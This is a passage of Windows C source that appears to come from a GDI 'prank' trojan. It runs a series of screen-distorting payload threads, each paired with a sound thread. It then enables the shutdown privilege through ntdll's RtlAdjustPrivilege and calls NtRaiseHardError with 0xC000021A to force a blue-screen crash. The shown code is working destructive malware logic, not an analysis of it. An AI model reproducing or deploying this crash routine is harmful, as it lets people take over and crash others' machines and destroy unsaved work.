    activePhase = 0; if (hThread3 != NULL) { WaitForSingleObject(hThread3, INFINITE); CloseHandle(hThread3); }
    RefreshScreenClean(); Sleep(1000);

    activePhase = 4;
    HANDLE hThread4 = CreateThread(NULL, 0, payload4, NULL, 0, NULL);
    HANDLE hSnd4 = CreateThread(NULL, 0, Sound4, NULL, 0, NULL);
    if (hSnd4 != NULL) { WaitForSingleObject(hSnd4, INFINITE); CloseHandle(hSnd4); }
    activePhase = 0; if (hThread4 != NULL) { WaitForSingleObject(hThread4, INFINITE); CloseHandle(hThread4); }
    RefreshScreenClean(); Sleep(1000);

    activePhase = 5;
    HANDLE hThread5 = CreateThread(NULL, 0, Playload5, NULL, 0, NULL);
    HANDLE hSnd5 = CreateThread(NULL, 0, Sound5, NULL, 0, NULL);
    if (hSnd5 != NULL) { WaitForSingleObject(hSnd5, INFINITE); CloseHandle(hSnd5); }
    activePhase = 0; if (hThread5 != NULL) { WaitForSingleObject(hThread5, INFINITE); CloseHandle(hThread5); }
    RefreshScreenClean(); Sleep(1000);

    activePhase = 6;
    HANDLE hThread6 = CreateThread(NULL, 0, payload6, NULL, 0, NULL);
    HANDLE hSnd6 = CreateThread(NULL, 0, Sound6, NULL, 0, NULL);
    if (hSnd6 != NULL) { WaitForSingleObject(hSnd6, INFINITE); CloseHandle(hSnd6); }
    activePhase = 0; if (hThread6 != NULL) { WaitForSingleObject(hThread6, INFINITE); CloseHandle(hThread6); }
    RefreshScreenClean(); Sleep(1000);

    activePhase = 7;
    HANDLE hThread7 = CreateThread(NULL, 0, Payload7, NULL, 0, NULL);
    HANDLE hSnd7 = CreateThread(NULL, 0, Sound7, NULL, 0, NULL);
    if (hSnd7 != NULL) { WaitForSingleObject(hSnd7, INFINITE); CloseHandle(hSnd7); }
    activePhase = 0; if (hThread7 != NULL) { WaitForSingleObject(hThread7, INFINITE); CloseHandle(hThread7); }
    RefreshScreenClean();

    DeleteDC(deskMem); DeleteObject(scr); ReleaseDC(NULL, hdc);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        RtlAdjustPrivilegeFunc RtlAdjustPrivilegeFn = (RtlAdjustPrivilegeFunc)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
        NtRaiseHardErrorFunc NtRaiseHardErrorFn = (NtRaiseHardErrorFunc)GetProcAddress(hNtdll, "NtRaiseHardError");
        if (RtlAdjustPrivilegeFn && NtRaiseHardErrorFn) {
            BOOLEAN bEnabled; RtlAdjustPrivilegeFn(19, TRUE, FALSE, &bEnabled);
            ULONG uResponse; NtRaiseHardErrorFn(0xC000021A, 0, 0, NULL, 6, &uResponse);
        }
    }

    Sleep(-1);
    return 0;
}
